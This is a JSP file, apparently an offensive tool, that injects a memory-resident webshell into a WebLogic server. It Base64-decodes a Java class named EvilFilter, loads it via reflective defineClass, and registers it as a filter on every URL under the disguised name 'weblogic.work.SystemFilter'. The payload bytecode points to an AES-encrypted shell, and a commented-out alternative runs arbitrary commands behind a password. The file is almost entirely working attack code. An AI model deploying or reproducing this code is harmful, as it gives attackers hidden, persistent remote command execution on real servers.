<%@page import="java.lang.reflect.Field"%>
<%@page import="java.lang.reflect.Method"%>
<%@page import="java.util.Map"%>
<%

//Thread.getCurrentThread();

//Runtime.getRuntime().exec("calc");

//((weblogic.work.ExecuteThread)Thread.currentThread()).getContextClassLoader().loadClass("java.lang.Runtime");

try {
	byte[] codeClass = java.util.Base64.getDecoder().decode("yv66vgAAADQBRQoAKACaBwCbCwACAJwIAJ0KAEMAngsAAgCfCACgCABvCwChAKIIAKMKAKQApQcApgoAQwCnCgAMAKgKAKQAqQcAqgoAEACaCAB4CgAQAKsIAHoHAKwKABUArQgAXQoArgCvCACwCgCxALIKALMAtAoAswC1CgAoALYKACAAtwgAuAcAuQcAZgkAugC7CgAgALwKAL0AvggAvwoAKwDABwDBBwDCCgC6AMMKAL0AxAcAxQoAIADGCgDHAL4KACAAyAoAxwDJCADKBwDLCgAxAJoLAMwAzQoAzgDPCgAxANAKAKQA0QoAIADSCADTBwDUCgA5ANULANYA1wcA2AoAIADZCgDaANsKANwA3QcA3goAQACaCADfBwDgCgBAAKsIAI8KAEAA4QoA4gDjCQDkAOUKAEAA5goA5wDoBwDpAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMRXZpbEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwDqAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQABZQEAIkxqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjsBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAFrAQASTGphdmEvbGFuZy9TdHJpbmc7AQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAA21hcAEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAhieXRlY29kZQEAAltCAQACY2wBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABmRlZmluZQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGdWNsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAtjb25zdHJ1Y3RvcgEAH0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAAF1AQASTGphdmEvbGFuZy9PYmplY3Q7AQACVW0BAA5ldmlsQ2xhc3NCeXRlcwEACWV2aWxjbGFzcwEAAWEBAAFiAQACZXgBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdyZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAFY2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAA1TdGFja01hcFRhYmxlBwDYBwDrBwDsBwDtBwDuBwDgBwDvBwCqBwDFBwDwBwC5BwDBBwDUBwDxAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAJhYQEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAN1cmwBAA1jYWNoZWRDbGFzc2VzAQAoTGphdmEvdXRpbC9jb25jdXJyZW50L0NvbmN1cnJlbnRIYXNoTWFwOwEAAml0AQAUTGphdmEvdXRpbC9JdGVyYXRvcjsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQBQTGphdmEvdXRpbC9jb25jdXJyZW50L0NvbmN1cnJlbnRIYXNoTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvQ2xhc3M8Kj47PjsBAApTb3VyY2VGaWxlAQAPRXZpbEZpbHRlci5qYXZhDABMAE0BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DADyAPMBAARQT1NUDADTAPQMAPUA9gEAEGU0NWUzMjlmZWI1ZDkyNWIHAO4MAPcA+AEAA0FFUwcA7wwA+QD6AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwA+wD8DABMAP0MAFMA/gEAEWphdmEvdXRpbC9IYXNoTWFwDAD/AQABACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwBAQECBwEDDAEEAQcBAmR5djY2dmdBQUFEUUFHZ29BQkFBVUNnQUVBQlVIQUJZSEFCY0JBQVk4YVc1cGRENEJBQm9vVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc3BWZ0VBQkVOdlpHVUJBQTlNYVc1bFRuVnRZbVZ5VkdGaWJHVUJBQkpNYjJOaGJGWmhjbWxoWW14bFZHRmliR1VCQUFSMGFHbHpBUUFEVEZVN0FRQUJZd0VBRjB4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdBUUFCWndFQUZTaGJRaWxNYW1GMllTOXNZVzVuTDBOc1lYTnpPd0VBQVdJQkFBSmJRZ0VBQ2xOdmRYSmpaVVpwYkdVQkFBWlZMbXBoZG1FTUFBVUFCZ3dBR0FBWkFRQUJWUUVBRldwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNnRUFDMlJsWm1sdVpVTnNZWE56QVFBWEtGdENTVWtwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNBSVFBREFBUUFBQUFBQUFJQUFBQUZBQVlBQVFBSEFBQUFPZ0FDQUFJQUFBQUdLaXUzQUFHeEFBQUFBZ0FJQUFBQUJnQUJBQUFBQWdBSkFBQUFGZ0FDQUFBQUJnQUtBQXNBQUFBQUFBWUFEQUFOQUFFQUFRQU9BQThBQVFBSEFBQUFQUUFFQUFJQUFBQUpLaXNESzc2M0FBS3dBQUFBQWdBSUFBQUFCZ0FCQUFBQUF3QUpBQUFBRmdBQ0FBQUFDUUFLQUFzQUFBQUFBQWtBRUFBUkFBRUFBUUFTQUFBQUFnQVQHAQgMAQkBCgcBCwwBDAENDAEOAQ8MARABEQwBEgERAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MHARMMARQAbAwBFQEWBwDwDAEXARgBAAFVDAEZARoBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9PYmplY3QMARsBHAwBHQEeAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDAEfASAHASEMASIBDwwBIwEkAQABZwEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIHAOsMASUBJgcBJwwBKADzDAEpAQoMASoBKwwBIwEsAQAGZXF1YWxzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBLQBNBwDtDABZAS4BAApFdmlsRmlsdGVyDAEvATAHATEMATIBMwcBNAwBNQE2AQAmamF2YS91dGlsL2NvbmN1cnJlbnQvQ29uY3VycmVudEhhc2hNYXABAAJiYgEAEGphdmEvbGFuZy9TdHJpbmcMATcBOQcBOgwBOwE8BwE9DAE+AT8MAUABQQcBQgwBQwFEAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAlnZXRNZXRob2QBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALZ2V0UmVzcG9uc2UBADEoKUx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGw7AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBAAdEZWNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEADWdldFN1cGVyY2xhc3MBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEADmdldENsYXNzTG9hZGVyAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAB2RvRmluYWwBAAYoW0IpW0IBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBABNnZXRQcm90ZWN0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");
	ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
	java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
	define.setAccessible(true);
	Class evilFilterClass  = (Class)define.invoke(cl,codeClass,0,codeClass.length);
	
	
	
            Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            java.lang.reflect.Method m = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = m.invoke(Thread.currentThread());

            java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            Object obj = connectionHandlerF.get(currentWork);

            java.lang.reflect.Field requestF = obj.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            obj = requestF.get(obj);

            java.lang.reflect.Field contextF = obj.getClass().getDeclaredField("context");
            contextF.setAccessible(true);
            Object context = contextF.get(obj);

         //   java.lang.reflect.Field classLoaderF = context.getClass().getDeclaredField("classLoader");
         //   classLoaderF.setAccessible(true);
         //   ClassLoader cl = (ClassLoader) classLoaderF.get(context);

            java.lang.reflect.Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
            cachedClassesF.setAccessible(true);
            Object cachedClass = cachedClassesF.get(cl);

            java.lang.reflect.Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
            if (getM.invoke(cachedClass, "shell") == null) {
             //   byte[] codeClass = java.util.Base64.getDecoder().decode("yv66vgAAADQAfQoAGQA5CQA6ADsIADwKAD0APggAMgsAPwBACAAzCgBBAEIIAEMKAEEARAgARQcARgoARwBICgBHAEkKAEoASwoADABMCABNCgAMAE4KAAwATwsAUABRCgBSAD4KAFIAUwsAVABVBwBWBwBXBwBYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMRXZpbEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwBZAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADcHdkAQADY21kAQANU3RhY2tNYXBUYWJsZQcAWgcAWwEAClNvdXJjZUZpbGUBAA9FdmlsRmlsdGVyLmphdmEMABsAHAcAXAwAXQBeAQArPT09PT09PT09PT09PT0gaW4gZXZpbGZpbHRlciA9PT09PT09PT09PT09PQcAXwwAYABhBwBiDABjAGQHAFoMAGUAZgEACGt1cm9uM2swDABnAGgBACo9PT09PT09PT09PT09PSAgcnVubmluZyBjbWQgPT09PT09PT09PT09PT0BABFqYXZhL3V0aWwvU2Nhbm5lcgcAaQwAagBrDABsAG0HAG4MAG8AcAwAGwBxAQACXEEMAHIAcwwAdAB1BwB2DAB3AHgHAHkMAHoAHAcAewwAKAB8AQAKRXZpbEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygpWgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAAVmbHVzaAEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAGAAZAAEAGgAAAAMAAQAbABwAAQAdAAAALwABAAEAAAAFKrcAAbEAAAACAB4AAAAGAAEAAAAJAB8AAAAMAAEAAAAFACAAIQAAAAEAIgAjAAIAHQAAADUAAAACAAAAAbEAAAACAB4AAAAGAAEAAAAOAB8AAAAWAAIAAAABACAAIQAAAAAAAQAkACUAAQAmAAAABAABACcAAQAoACkAAgAdAAABEgAEAAcAAABysgACEgO2AAQrEgW5AAYCADoEKxIHuQAGAgA6BRkFtgAImgBIGQQSCbYACpkAPrIAAhILtgAEuwAMWbgADRkFtgAOtgAPtwAQEhG2ABK2ABM6Biy5ABQBABkGtgAVLLkAFAEAtgAWpwALLSssuQAXAwCxAAAAAwAeAAAALgALAAAAEgAIABMAEgAUABwAFgAuABcANgAYAFIAGQBdABoAZgAcAGkAHQBxAB8AHwAAAEgABwBSABQAKgArAAYAAAByACAAIQAAAAAAcgAsAC0AAQAAAHIALgAvAAIAAAByADAAMQADABIAYAAyACsABAAcAFYAMwArAAUANAAAAAwAAv0AaQcANQcANQcAJgAAAAYAAgA2ACcAAQA3AAAAAgA4");
             //   java.lang.reflect.Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             //   defineClass.setAccessible(true);
             //   Class evilFilterClass = (Class) defineClass.invoke(cl, codeClass, 0, codeClass.length);

                String evilName = "weblogic.system.method";
                String filterName = "weblogic.work.SystemFilter";
                String[] url = new String[]{"/*"};

                java.lang.reflect.Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                putM.invoke(cachedClass, filterName, evilFilterClass);
                java.lang.reflect.Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
                Object filterManager = getFilterManagerM.invoke(context);

                java.lang.reflect.Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, java.util.Map.class, String[].class);
                registerFilterM.setAccessible(true);
                registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
            }
			
        } catch (Exception e) {
            e.printStackTrace();
        }
%>